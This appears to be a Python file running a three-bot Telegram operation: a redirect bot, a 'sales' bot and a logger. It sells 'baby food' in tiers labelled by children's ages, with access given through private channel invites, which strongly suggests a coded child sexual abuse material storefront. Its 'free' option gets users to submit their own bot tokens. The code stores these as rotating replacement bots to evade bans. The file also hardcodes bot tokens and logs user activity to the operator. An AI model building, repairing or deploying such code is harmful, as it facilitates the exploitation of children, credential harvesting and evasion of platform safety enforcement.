# telegram_twin_bot_system.py
# Единый файл с тремя ботами: основной (переходник), рабочий (продажи), логгер
# Запуск: python telegram_twin_bot_system.py

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import time
import threading
import requests
import random
import sys
import signal

# ========== КОНФИГУРАЦИЯ ==========
MAIN_BOT_TOKEN = "8919013227:AAE_63ez-hd17qEdq5po_k7N2CclzHicY0w"
WORKER_BOT_TOKEN = "8913951478:AAGpBtNbN7pa9Gqk9_inuaJIOgfTqbccmz0"
LOGGER_BOT_TOKEN = "8902065807:AAHk0oPacGI1A6RYoV_2Tr9x_Pcm5VOtv54"

# Канал с отзывами
REVIEWS_CHANNEL = "https://t.me/+7bOC6qtTw2s3NjBh"

# ========== БАЗА ДАННЫХ ==========
conn = sqlite3.connect('twin_bot.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS worker_bots 
             (token TEXT PRIMARY KEY, username TEXT, added_by TEXT, timestamp INTEGER, is_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS current_worker 
             (id INTEGER PRIMARY KEY, token TEXT, username TEXT, updated_at INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS payments 
             (user_id TEXT, amount TEXT, category TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_sessions 
             (user_id TEXT, temp_token TEXT, step TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_stats 
             (user_id TEXT, purchases INTEGER, tokens_submitted INTEGER, last_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS bot_health_log 
             (bot_token TEXT, check_time INTEGER, is_alive INTEGER)''')
conn.commit()

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def log_to_logger(message_text):
    """Отправка лога в бота-логгера"""
    try:
        url = f"https://api.telegram.org/bot{LOGGER_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": "8919013227", "text": message_text[:4000], "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=3)
    except Exception as e:
        print(f"Логгер ошибка: {e}")

def get_current_worker():
    """Получить текущего рабочего бота"""
    c.execute("SELECT token, username FROM current_worker WHERE id=1 ORDER BY updated_at DESC LIMIT 1")
    row = c.fetchone()
    if row:
        return row[0], row[1]
    return WORKER_BOT_TOKEN, "worker_bot"

def set_current_worker(token, username):
    """Установить текущего рабочего бота"""
    c.execute("DELETE FROM current_worker WHERE id=1")
    c.execute("INSERT INTO current_worker (id, token, username, updated_at) VALUES (1, ?, ?, ?)",
              (token, username, int(time.time())))
    conn.commit()
    log_to_logger(f"🔄 СМЕНА РАБОЧЕГО БОТА\nНовый: @{username}")

def check_bot_alive(token):
    """Проверка жив ли бот"""
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        r = requests.get(url, timeout=5)
        data = r.json()
        if data.get('ok'):
            return True, data['result']['username']
        return False, None
    except:
        return False, None

def add_worker_bot(token, username, added_by):
    """Добавить новый рабочий бот в базу"""
    c.execute("INSERT OR REPLACE INTO worker_bots (token, username, added_by, timestamp, is_active) VALUES (?, ?, ?, ?, 1)",
              (token, username, added_by, int(time.time())))
    conn.commit()
    log_to_logger(f"➕ ДОБАВЛЕН БОТ В БАЗУ\nЮзер: @{username}\nКем добавлен: {added_by}")

def get_all_worker_bots():
    """Получить все активные рабочие боты"""
    c.execute("SELECT token, username FROM worker_bots WHERE is_active=1 ORDER BY timestamp DESC")
    return c.fetchall()

def rotate_worker():
    """Ротация рабочего бота при смерти текущего"""
    current_token, current_name = get_current_worker()
    alive, _ = check_bot_alive(current_token)
    
    if not alive:
        log_to_logger(f"⚠️ РАБОЧИЙ БОТ МЁРТВ: @{current_name}")
        
        all_bots = get_all_worker_bots()
        for token, username in all_bots:
            if token == current_token:
                continue
            alive2, _ = check_bot_alive(token)
            if alive2:
                set_current_worker(token, username)
                log_to_logger(f"✅ РОТАЦИЯ НА: @{username}")
                return True
        
        log_to_logger(f"❌ НЕТ ЖИВЫХ БОТОВ! Использую резервный")
        set_current_worker(WORKER_BOT_TOKEN, "worker_bot_default")
        return False
    return True

def monitor_worker_health():
    """Фоновый мониторинг (каждые 10 минут)"""
    while True:
        try:
            rotate_worker()
        except Exception as e:
            log_to_logger(f"Ошибка мониторинга: {e}")
        time.sleep(600)

# ========== ОСНОВНОЙ БОТ (ПЕРЕХОДНИК) ==========
main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)

@main_bot.message_handler(commands=['start'])
def main_bot_start(message):
    user_id = str(message.from_user.id)
    current_token, current_username = get_current_worker()
    
    alive, username_real = check_bot_alive(current_token)
    if not alive:
        rotate_worker()
        current_token, current_username = get_current_worker()
    
    text = f"""🤖 <b>АКТУАЛЬНЫЙ БОТ С ДЕТСКИМ ПИТАНИЕМ</b>

@{current_username}

👇 Нажми на username выше, чтобы перейти к покупке"""
    
    main_bot.reply_to(message, text, parse_mode='HTML')
    log_to_logger(f"🚪 ПЕРЕХОД\nЮзер: {user_id}\nБот: @{current_username}")

# ========== РАБОЧИЙ БОТ (ПРОДАЖИ) ==========
worker_bot = telebot.TeleBot(WORKER_BOT_TOKEN)

def generate_menu_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛒 МАГАЗИН", callback_data="shop"),
        InlineKeyboardButton("🍼 БЕСПЛАТНОЕ ПИТАНИЕ", callback_data="free"),
        InlineKeyboardButton("⭐ ОТЗЫВЫ", callback_data="reviews")
    )
    return keyboard

@worker_bot.message_handler(commands=['start'])
def worker_bot_start(message):
    user_id = str(message.from_user.id)
    
    c.execute("INSERT OR REPLACE INTO user_stats (user_id, purchases, tokens_submitted, last_active) VALUES (?, COALESCE((SELECT purchases FROM user_stats WHERE user_id=?), 0), COALESCE((SELECT tokens_submitted FROM user_stats WHERE user_id=?), 0), ?)",
              (user_id, user_id, user_id, int(time.time())))
    conn.commit()
    
    text = """<b>🍼 ДЕТСКОЕ ПИТАНИЕ SHOP</b>

Выбери действие в меню ниже:"""
    
    worker_bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=generate_menu_keyboard())
    log_to_logger(f"👤 ЗАПУСК РАБОЧЕГО БОТА\nЮзер: {user_id}")

@worker_bot.callback_query_handler(func=lambda call: True)
def worker_bot_callback(call):
    user_id = str(call.from_user.id)
    
    # Кнопка ОТЗЫВЫ
    if call.data == "reviews":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("⭐ ПЕРЕЙТИ В КАНАЛ С ОТЗЫВАМИ", url=REVIEWS_CHANNEL))
        keyboard.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text(
            "⭐ <b>КАНАЛ С ОТЗЫВАМИ</b>\n\nНаши клиенты делятся впечатлениями. Нажми на кнопку ниже, чтобы перейти и убедиться в качестве!",
            call.message.chat.id, 
            call.message.message_id, 
            parse_mode='HTML', 
            reply_markup=keyboard
        )
        log_to_logger(f"⭐ ОТЗЫВЫ\nЮзер: {user_id}")
        return
    
    elif call.data == "shop":
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("👶 5-10 лет - 500₽", callback_data="buy_5_10"),
            InlineKeyboardButton("🧒 10-17 лет - 800₽", callback_data="buy_10_17"),
            InlineKeyboardButton("🔙 Назад", callback_data="back")
        )
        worker_bot.edit_message_text("📦 <b>Выбери категорию питания:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=keyboard)
    
    elif call.data == "buy_5_10":
        payment_link = "https://t.me/+KIYBiERHtzMzZmVi"
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("💳 ОПЛАТИТЬ", url=payment_link),
            InlineKeyboardButton("🔙 Назад", callback_data="shop")
        )
        text = """<b>👶 ДЕТСКОЕ ПИТАНИЕ 5-10 ЛЕТ</b>

💰 Цена: 500₽
📦 Состав: 30 порций

🔗 Ссылка на оплату ниже

<b>⚠️ После оплаты вам автоматически добавит в канал</b>"""
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=keyboard)
        log_to_logger(f"💳 ОПЛАТА (ИНИЦИАЦИЯ)\nЮзер: {user_id}\nКатегория: 5-10 лет\nСумма: 500₽")
    
    elif call.data == "buy_10_17":
        payment_link = "https://t.me/+JgSRSMJp6ww4MzUy"
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("💳 ОПЛАТИТЬ", url=payment_link),
            InlineKeyboardButton("🔙 Назад", callback_data="shop")
        )
        text = """<b>🧒 ДЕТСКОЕ ПИТАНИЕ 10-17 ЛЕТ</b>

💰 Цена: 800₽
📦 Состав: 50 порций

🔗 Ссылка на оплату ниже

<b>⚠️ После оплаты вам автоматически добавит в канал</b>"""
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=keyboard)
        log_to_logger(f"💳 ОПЛАТА (ИНИЦИАЦИЯ)\nЮзер: {user_id}\nКатегория: 10-17 лет\nСумма: 800₽")
    
    elif call.data == "free":
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("🤖 СОЗДАТЬ БОТА", url="https://t.me/botfather"),
            InlineKeyboardButton("📤 ОТПРАВИТЬ ТОКЕН", callback_data="send_token"),
            InlineKeyboardButton("🔙 Назад", callback_data="back")
        )
        text = """<b>🍼 БЕСПЛАТНОЕ ПИТАНИЕ</b>

Чтобы получить детское питание бесплатно:

1. Создай своего бота в <b>@BotFather</b>
2. Отправь его токен сюда
3. Получи ссылку на бесплатный канал

⚠️ Токен проверяется автоматически. Бот должен быть живым."""
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=keyboard)
    
    elif call.data == "send_token":
        worker_bot.send_message(call.message.chat.id, "📝 Отправь токен своего бота в формате:\n`1234567890:ABCdefGHIjklmNOPqrstUvwXYZ`", parse_mode='Markdown')
        c.execute("INSERT OR REPLACE INTO user_sessions (user_id, temp_token, step, timestamp) VALUES (?, ?, ?, ?)",
                  (user_id, "", "awaiting_token", int(time.time())))
        conn.commit()
        try:
            worker_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
    
    elif call.data == "back":
        worker_bot.edit_message_text("<b>🍼 ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nВыбери действие в меню ниже:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=generate_menu_keyboard())

@worker_bot.message_handler(func=lambda m: True)
def handle_token_submission(message):
    user_id = str(message.from_user.id)
    
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row or row[0] != "awaiting_token":
        return
    
    token = message.text.strip()
    
    if not token or ':' not in token:
        worker_bot.reply_to(message, "❌ Неверный формат токена. Формат: `1234567890:ABCdef...`", parse_mode='Markdown')
        return
    
    alive, username = check_bot_alive(token)
    if not alive:
        worker_bot.reply_to(message, "❌ Бот с таким токеном не существует или заблокирован.")
        return
    
    add_worker_bot(token, username, user_id)
    
    c.execute("UPDATE user_stats SET tokens_submitted = COALESCE(tokens_submitted, 0) + 1, last_active=? WHERE user_id=?", (int(time.time()), user_id))
    conn.commit()
    
    free_channel = "https://t.me/+fEQI916fF2ZkNDMx"
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🍼 ПОЛУЧИТЬ БЕСПЛАТНО", url=free_channel))
    
    worker_bot.send_message(message.chat.id, f"✅ Токен принят! Бот @{username} добавлен в базу.\n\n🎁 Вот твоя ссылка на бесплатное питание:", reply_markup=keyboard)
    
    c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
    conn.commit()
    
    log_to_logger(f"🎁 ВЫДАЧА БЕСПЛАТНОГО ДОСТУПА\nЮзер: {user_id}\nБот: @{username}")

# ========== ЗАПУСК ВСЕХ БОТОВ ==========
def run_bot(bot_instance, name):
    while True:
        try:
            print(f"✅ {name} запущен")
            bot_instance.polling(none_stop=True, interval=3, timeout=30)
        except Exception as e:
            print(f"❌ {name} ошибка: {e}")
            log_to_logger(f"Ошибка {name}: {str(e)[:200]}")
            time.sleep(5)

if __name__ == "__main__":
    # Добавляем дефолтного бота
    default_username = "worker_bot"
    try:
        _, username = check_bot_alive(WORKER_BOT_TOKEN)
        if username:
            default_username = username
    except:
        pass
    
    add_worker_bot(WORKER_BOT_TOKEN, default_username, "system")
    set_current_worker(WORKER_BOT_TOKEN, default_username)
    
    # Запускаем мониторинг
    monitor_thread = threading.Thread(target=monitor_worker_health, daemon=True)
    monitor_thread.start()
    
    # Запускаем ботов
    main_thread = threading.Thread(target=run_bot, args=(main_bot, "ОСНОВНОЙ БОТ"), daemon=True)
    worker_thread = threading.Thread(target=run_bot, args=(worker_bot, "РАБОЧИЙ БОТ"), daemon=True)
    
    main_thread.start()
    worker_thread.start()
    
    log_to_logger("🚀 СИСТЕМА ЗАПУЩЕНА")
    print("✅ Все боты запущены. Нажми Ctrl+C для остановки.")
    
    # Держим поток живым
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n⏹️ Остановка...")
        conn.close()
        sys.exit(0)